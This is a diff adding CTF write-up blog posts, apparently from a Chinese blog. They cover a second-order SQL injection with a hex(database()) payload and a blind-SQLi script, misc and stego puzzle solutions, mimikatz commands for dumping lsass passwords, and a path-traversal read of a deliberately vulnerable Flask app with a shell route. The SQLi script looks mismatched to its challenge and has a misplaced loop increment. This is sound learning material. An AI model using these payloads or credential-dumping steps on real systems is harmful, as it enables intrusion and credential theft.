@@ -71,6 +71,249 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-114" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/09/09/page-114/" class="article-date">
+  <time class="dt-published" datetime="2021-09-09T08:37:38.000Z" itemprop="datePublished">2021-09-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/09/09/page-114/">page</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h6 id="这是二次注入的关卡-就register-php那边需要用户名-但是登录过程不需要"><a href="#这是二次注入的关卡-就register-php那边需要用户名-但是登录过程不需要" class="headerlink" title="这是二次注入的关卡 就register.php那边需要用户名 但是登录过程不需要"></a>这是二次注入的关卡 就register.php那边需要用户名 但是登录过程不需要</h6><p>登陆后可以看到用户名 测试了一下用户名那边<strong>过滤了information 和逗号</strong></p>
+<p>好再来学一个神奇的sql方式 </p>
+<p>通过hex将数据库的名字转成十六进制输出</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/272.PNG?raw=true" alt="272.PNG"></p>
+<p>用户名：’+hex(database())+’</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/273.PNG?raw=true" alt="273.PNG"></p>
+<p>数据库名字web</p>
+<blockquote>
+<p>在本地测试下。发现一次HEX。字符串还是会存在英文。会退出。那就2次hex。发现变成了科学计数法。用substr截取就可以了。 </p>
+</blockquote>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/274.PNG?raw=true" alt="274.PNG"></p>
+<p>上脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs/Less-8&quot;</span><br><span class="line"></span><br><span class="line">normalHtmlLen = len(requests.get(url=url+&quot;?id=1&quot;).text)</span><br><span class="line"></span><br><span class="line">print(str(normalHtmlLen))</span><br><span class="line"></span><br><span class="line">dbNameLen = 0</span><br><span class="line">while True:</span><br><span class="line">    dbNameLen_url = url+&quot;?id=1&#x27;+and+length(database())=&quot;+str(dbNameLen)+&quot;--+&quot;</span><br><span class="line">    print(dbNameLen_url)</span><br><span class="line">    if len(requests.get(dbNameLen_url).text) == normalHtmlLen:</span><br><span class="line">        print(dbNameLen)</span><br><span class="line">        break</span><br><span class="line">    if dbNameLen == 30:</span><br><span class="line">        print(&quot;ERROR&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">dbNameLen +=1</span><br></pre></td></tr></table></figure>
+
+<p>结果两次转码一下就完成了</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/275.PNG?raw=true" alt="275.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/09/09/page-114/" data-id="ckuz7ucqy000g3sw7gxv7dehw" data-title="page" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-110" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/13/page-110/" class="article-date">
+  <time class="dt-published" datetime="2021-08-13T09:37:34.000Z" itemprop="datePublished">2021-08-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>间谍启示录</strong><br>这题很奇怪就瞎找 镜像文件装载一下 一堆的隐藏文件<br>一堆的东西啥都么有除了<strong>systemzx.exe</strong>可以运行但还提示权限之类的将要销毁<br>丢010 发现还含有压缩包 直接解压 flag.exe丢010 查找一下就能找到了<br><strong>[ACTF新生赛2020]swp</strong><br>这个也简单 导出为http然后那一堆的文件有个压缩包解压缩一下 文件丢010 搜索一下就能找到flag<br><strong>[安洵杯 2019]吹着贝斯扫二维码</strong><br>压缩包里有一串注释<br>吹个鬼的base文件一堆没有格式 老伙计010 哟是jpg 那就批处理文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ren *.* *.jpg 另存为.bat就能全部变成jpg 然后漫长的拼图时间 </span><br></pre></td></tr></table></figure>
+
+<p>┗|｀O′|┛</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/143.PNG?raw=true" alt="143.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/144.PNG?raw=true" alt="144.PNG"></p>
+<p>给了这么串信息<strong>BASE Family Bucket ??? 85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32</strong><br>应该是压缩包的注释通过base85 再64 等等等<br>还原回去 底下还有From Base85 </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/145.PNG?raw=true" alt="145.PNG"></p>
+<p>密码正确 flag到手</p>
+<p><strong>[DDCTF2018](╯°□°）╯︵ ┻━┻</strong><br>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd<br>长度<strong>为134的字符串 按每两位截取的十六进制</strong><br>转为<strong>十进制   发现都是大于128的数应该是ascii码 减去128 将得到ascii转换成字符</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line"># author: mochu7</span><br><span class="line"></span><br><span class="line">def hex_str(str):#对字符串进行切片操作，每两位截取</span><br><span class="line">    hex_str_list=[]</span><br><span class="line">    for i in range(0,len(str)-1,2):</span><br><span class="line">        hex_str=str[i:i+2]</span><br><span class="line">        hex_str_list.append(hex_str)</span><br><span class="line">    print(&quot;hex列表：%s\n&quot;%hex_str_list)</span><br><span class="line">    hex_to_str(hex_str_list)</span><br><span class="line"></span><br><span class="line">def hex_to_str(hex_str_list):</span><br><span class="line">    int_list=[]</span><br><span class="line">    dec_list=[]</span><br><span class="line">    flag=&#x27;&#x27;</span><br><span class="line">    for i in range(0,len(hex_str_list)):#把16进制转化为10进制</span><br><span class="line">        int_str=int(&#x27;0x%s&#x27;%hex_str_list[i],16)</span><br><span class="line">        int_list.append(int_str)</span><br><span class="line">        dec_list.append(int_str-128)#-128得到正确的ascii码</span><br><span class="line">    for i in range(0,len(dec_list)):#ascii码转化为字符串</span><br><span class="line">        flag += chr(dec_list[i])</span><br><span class="line">    print(&quot;转化为十进制int列表：%s\n&quot;%int_list)</span><br><span class="line">    print(&quot;-128得到ASCII十进制dec列表：%s\n&quot;%dec_list)</span><br><span class="line">    print(&#x27;最终答案：%s&#x27;%flag)</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    str=&#x27;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd&#x27;</span><br><span class="line">    print(&quot;字符串长度：%s&quot;%len(str))</span><br><span class="line">    hex_str(str)</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105324802">https://blog.csdn.net/mochu7777777/article/details/105324802</a></p>
+<p><strong>百里挑一</strong><br>导出的一大堆的图片一点用都没有┗|｀O′|┛<br>先利用之前群里大佬分享的flag寻找工具找到一半flag </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/173.PNG?raw=true" alt="173.PNG"></p>
+<p>然后开始很恶心人的时候了一个流一个流找 拿到另一半</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/174.PNG?raw=true" alt="174.PNG"></p>
+<p>flag{ae58d0408e26e8f26a3c0589d23edeec}</p>
+<p><strong>[WUSTCTF2020]爬</strong><br>拿到无格式文件010 是个pdf 添加格式后 打开提示flag被图片覆盖了<br><strong>pdf转word发现图片底下还有个图片</strong> 取消组合然后将另一张图的是是<strong>一串十六进制图片识别复制转 ok</strong></p>
+<p><strong>[安洵杯 2019]Attack</strong><br>又是抓包文件  这居然还是个压缩包但是另一个文件解不出来<br>从抓包文件找 <strong>到处http然后有个lsass.dmp</strong> lsass.exe是一个系统重要进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略。<br><strong>这个可以获取到管理员的密码</strong><br>mimikatz这个软件内网渗透工具 可以在lsass.exe中获取windows账号的密码</p>
+<p>管理员身份运行</p>
+<p>然后输入如下命令</p>
+<p>privilege::debug<br>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonpasswords full<br>将dmp和这个exe放在同路径下<br>获得到密码就可以解压缩那个抓包文件了</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/175.PNG?raw=true" alt="175.PNG"></p>
+<p><strong>[MRCTF2020]千层套路</strong><br>真的千层套路 烦死了压缩包完又是压缩包<br>上脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">name = &#x27;0573&#x27;</span><br><span class="line">while True:</span><br><span class="line">    fz = zipfile.ZipFile(name + &#x27;.zip&#x27;, &#x27;r&#x27;)</span><br><span class="line">    fz.extractall(pwd=bytes(name, &#x27;utf-8&#x27;))</span><br><span class="line">    name = fz.filelist[0].filename[0:4]</span><br><span class="line">    fz.close()</span><br></pre></td></tr></table></figure>
+
+<p>总共六百多个压缩包 最后一个<strong>qr.zip</strong> 解压得到文本文档<br>有很多的(255,255,255)应该是rgb信息然后255，255，255是黑色的二维码没错了<br>上脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">x = 200    #x坐标  通过对txt里的行数进行整数分解</span><br><span class="line">y = 200    #y坐标  x * y = 行数</span><br><span class="line"></span><br><span class="line">im = Image.new(&quot;RGB&quot;, (x, y))   #创建图片</span><br><span class="line">file = open(&#x27;qr.txt&#x27;)    #打开rbg值的文件</span><br><span class="line"></span><br><span class="line">#通过每个rgb点生成图片</span><br><span class="line"></span><br><span class="line">for i in range(0, x):</span><br><span class="line">    for j in range(0, y):</span><br><span class="line">        line = file.readline()  #获取一行的rgb值</span><br><span class="line">        if line==&#x27;(255, 255, 255)\n&#x27;:  # 粗暴的赋值……处理字符串实在麻烦</span><br><span class="line">            rgb=[255,255,255]</span><br><span class="line">        else:</span><br><span class="line">            rgb = [0, 0, 0]</span><br><span class="line">        im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))    #将rgb转化为像素</span><br><span class="line"></span><br><span class="line">im.save(&#x27;flag.jpg&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>完成</p>
+<p><strong>[SUCTF 2019]Game</strong><br>两个文件一个图一个文档 文档用之前群里的工具找到flag 但是是假的 ╮(╯▽╰)╭</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/178.PNG?raw=true" alt="178.PNG"></p>
+<p>图片那边各通道的零那边找到一串base64码 </p>
+<p>U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</p>
+<p>但是解码后是什么salted  看这串开头是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usfsd那么应该是aes或者3des加密</span><br></pre></td></tr></table></figure>
+
+<p>密钥找来找去也就只有那个假的flag了</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/177.PNG?raw=true" alt="177.PNG"></p>
+<p>解密成功</p>
+<p><strong>[MRCTF2020]CyberPunk</strong><br>又是赛博朋克 气死我了看到这个游戏就烦<br>打开exe说得<strong>到9 17 日才能拿到flag</strong> 哈哈天真了他又跳票了<br>还读取了我的系统时间那就改系统时间 就好了</p>
+<p><strong>[WUSTCTF2020]girlfriend</strong><br>音频题 听声音是拨号盘按键音上软件 <strong>DTMF2NUM</strong><br>可以识别按键音按了些什么   </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/212.PNG?raw=true" alt="212.PNG"></p>
+<p>999 666 88 2 777 33 6 999 4 4444 777 555 333 777 444 33 66 3 7777 </p>
+<p>看样子是九键的样子 换成字母<br>youaremygirlfriends 不要脸还加s 啧</p>
+<p><strong>usb</strong><br>拿到个rar包和ftm文件  但是题目又提示usb  压缩包<strong>虽然这么大但是解压出来东西就1kb</strong> 绝对有问题<br>遇事不决010 发现提示crc校验问题  </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/213.PNG?raw=true" alt="213.PNG"></p>
+<p>然后刚才的ftm发现有**.pcap文件** 抓包文件<br>直接解压缩他 得到key.pcap usb数据包 用UsbKeyboardDataHacker   <a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a><br> 提取内容  xinan</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/216.PNG?raw=true" alt="216.PNG"></p>
+<p>接下去解决压缩包crc校验问题  <a target="_blank" rel="noopener" href="https://www.freebuf.com/column/199854.html">https://www.freebuf.com/column/199854.html</a><br>  010 这边发现有个233.png 图片的文件块HEAD_TYPE应该是74 而不是7A </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/217.PNG?raw=true" alt="217.PNG"></p>
+<p>解压出图片 蓝色通道0那边找到一个二维码 ci{v3erf_0tygidv2_fc0}得到这个<br>剩下的就是看别人的wp了什么见都没见过</p>
+<p><strong>有维吉尼亚密码  还有栅栏密码</strong> </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/215.PNG?raw=true" alt="215.PNG"></p>
+<p><strong>[SUCTF2018]followme</strong><br>流量包 追踪流8000多个 什么都没有 导出为http对象<br>发现很多login%3f_= 的文件 感觉flag就在里面 上神奇的flag查找工具 还真找到了而且还真的对</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/185.PNG?raw=true" alt="185.PNG"></p>
+<p><strong>[XMAN2018排位赛]通行证</strong><br>一串base64 然后感觉需要<strong>栅栏和凯撒密码配合</strong> 试了好几组解密都不行<br>看了别人的 要先栅栏加密7位然后凯撒位移13位</p>
+<p><strong>[GUET-CTF2019]虚假的压缩包</strong><br>两个包虚假的那个是伪加密 修改一下 得到这个<br>数学题<br>n = 33<br>e = 3<br>解26</p>
+<hr>
+<p>答案是<br><strong>看到n e 考虑rsa加密</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">p=gmpy2.mpz(3)</span><br><span class="line">q=gmpy2.mpz(11)</span><br><span class="line">e=gmpy2.mpz(3)</span><br><span class="line">l=(p-1)*(q-1)</span><br><span class="line">d=gmpy2.invert(e,l)</span><br><span class="line">c=gmpy2.mpz(26)</span><br><span class="line">n=p*q</span><br><span class="line">ans=pow(c,d,n)</span><br><span class="line">print ans </span><br></pre></td></tr></table></figure>
+
+<p> 得到数字5 应该就是另一个压缩包的密码<br>解压真实的压缩包拿到图片和一个文件 图片crc校验问题修改高度</p>
+<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/194.PNG?raw=true" alt="194.PNG"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">拿到^5 异或5的标准 也是和刚才的加密一个思路 不过这边是单个字符</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f1 = open(&#x27;./cipher&#x27;,&#x27;r&#x27;)</span><br><span class="line">xor_data = f1.read()</span><br><span class="line">f1.close()</span><br><span class="line">dec_data = &quot;&quot;</span><br><span class="line">for i in xor_data:</span><br><span class="line">    tmp = int(i,16) ^ 5</span><br><span class="line">    dec_data += hex(tmp)[2:]</span><br><span class="line">f2 = open(&#x27;./data.doc&#x27;,&#x27;wb&#x27;)</span><br><span class="line">f2.write(dec_data.decode(&#x27;hex&#x27;))</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure>
+
+<p>拿到一个word文档改一下字体颜色就能看到flag</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/195.PNG?raw=true" alt="195.PNG"></p>
+<p><strong>[SWPU2019]Network</strong><br>一个十兆的文档打开都要好久<br>提示了network 然后<strong>好多63 127 255 191一直再重复</strong><br><strong>首先考虑就是TTL隐写</strong><br>啥是TTL隐写？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。</span><br><span class="line">   TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，</span><br><span class="line">   远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。</span><br></pre></td></tr></table></figure>
+
+
+<p>​    如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。<br>所以TTL隐写中用到的四个值 00 111111(63) 01 111111(127) 10 111111 (191) 11 111111 (255) 解密时只需取前两位 然后转换成ascii</p>
+<p><strong>就是 00 替代63 01 替代127 10 替代191 11 替代255</strong></p>
+<p>然后老熟人脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">f=open(&quot;attachment.txt&quot;,&quot;r&quot;)</span><br><span class="line">f2=open(&quot;aaa.txt&quot;,&quot;wb&quot;)</span><br><span class="line">num=&#x27;&#x27;</span><br><span class="line">res=&#x27;&#x27;</span><br><span class="line">for i in f:</span><br><span class="line">    if int(i)==63:</span><br><span class="line">        num+=&quot;00&quot;</span><br><span class="line">    if int(i)==127:</span><br><span class="line">        num+=&quot;01&quot;</span><br><span class="line">    if int(i)==191:</span><br><span class="line">        num+=&quot;10&quot;</span><br><span class="line">    if int(i)==255:</span><br><span class="line">        num+=&quot;11&quot;</span><br><span class="line">for j in range(0,len(num),8):</span><br><span class="line">    res += chr(int(num[j:j+8],2))#转换为字符</span><br><span class="line">res = binascii.unhexlify(res)#unhexlify:从十六进制字符串返回二进制数据</span><br><span class="line">f2.write(res)</span><br></pre></td></tr></table></figure>
+
+<p>得到的文档其实是个压缩包 改格式解压拿到一个很大串的base64套娃加密<br>慢慢解 或者脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">f = open(&#x27;aaa.txt&#x27;,&#x27;rb&#x27;).read()</span><br><span class="line">while True:</span><br><span class="line">    f = base64.b64decode(f)</span><br><span class="line">    if b&#x27;&#123;&#x27; in f:</span><br><span class="line">        print(f)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/197.PNG?raw=true" alt="197.PNG"></p>
+<p><strong>[GKCTF 2021]excel 骚操作</strong><br>属实玩明白了<br>这个excel打开问我看到flag了吗？ 当然没有 随便点了几个单元格发现有的有1有的没有</p>
+<p>将单元格值为1的显示出来  ctrl+a  右键 设置单元格格式</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/199.PNG?raw=true" alt="199.PNG"></p>
+<p>然后所有的1就会显示出来 在将有1的单元格突出显示 </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/200.PNG?raw=true" alt="200.PNG"></p>
+<p>选择这个然后突出显示单元格规则那边选择等于 等于1的自定义成黑色 </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/201.PNG?raw=true" alt="201.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/202.PNG?raw=true" alt="202.PNG"></p>
+<p>你问我看到flag了吗？ 看到了但是不知道这是什么┗|｀O′|┛</p>
+<p>看别人的wp 这玩意叫汉信码  中国编码网那边可以下载相应app扫码<br>妈的还要注册才给扫码<br>算了直接看别人拿到的flag</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/203.PNG?raw=true" alt="203.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/08/13/page-110/" data-id="ckuz7ucqx000e3sw794p344fm" data-title="一大堆的misc 很大一堆" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-109" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/13/page-109/" class="article-date">
+  <time class="dt-published" datetime="2021-08-13T09:37:31.000Z" itemprop="datePublished">2021-08-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>抓包存在任意文件读取漏洞  发现可以直接读取flag  好了本题结束 </p>
+<p>并没有！！！<br>通过这个读取漏洞 获得当前进程执行命令<br>../../../../../proc/self/cmdline</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/proc/pid/cmdline  包含了用于开始进程的命令  ；</span><br><span class="line">/proc/pid/cwd 包含了当前进程工作目录的一个链接  ；</span><br><span class="line">/proc/pid/environ  包含了可用进程环境变量的列表  ；</span><br><span class="line">/proc/pid/exe  包含了正在进程中运行的程序链接；</span><br><span class="line">/proc/pid/fd/  这个目录包含了进程打开的每一个文件的链接；</span><br><span class="line">/proc/pid/mem  包含了进程在内存中的内容；</span><br><span class="line">/proc/pid/stat 包含了进程的状态信息；</span><br><span class="line">/proc/pid/statm  包含了进程的内存使用信息。</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shenhuxi_yu/article/details/79697792">https://blog.csdn.net/shenhuxi_yu/article/details/79697792</a> 讲了linux proc/pid/信息说明</p>
+<p>这是通过python2 执行app.py文件  读取看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, Response</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask import request</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = &quot;/tmp/secret.txt&quot;</span><br><span class="line">f = open(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;search.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/page&#x27;)</span><br><span class="line">def page():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    try:</span><br><span class="line">        if not url.lower().startswith(&quot;file&quot;):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=&#x27;application/octet-stream&#x27;)</span><br><span class="line">            response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27;</span><br><span class="line">            return response</span><br><span class="line">        else:</span><br><span class="line">            value = &quot;HACK ERROR!&quot;</span><br><span class="line">    except:</span><br><span class="line">        value = &quot;SOMETHING WRONG!&quot;</span><br><span class="line">    return render_template(&#x27;search.html&#x27;, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span><br><span class="line">def manager():</span><br><span class="line">    key = request.args.get(&quot;key&quot;)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    if key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(&quot;shell&quot;)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = &quot;ok&quot;</span><br><span class="line">    else:</span><br><span class="line">        res = &quot;Wrong Key!&quot;</span><br><span class="line"></span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>
+
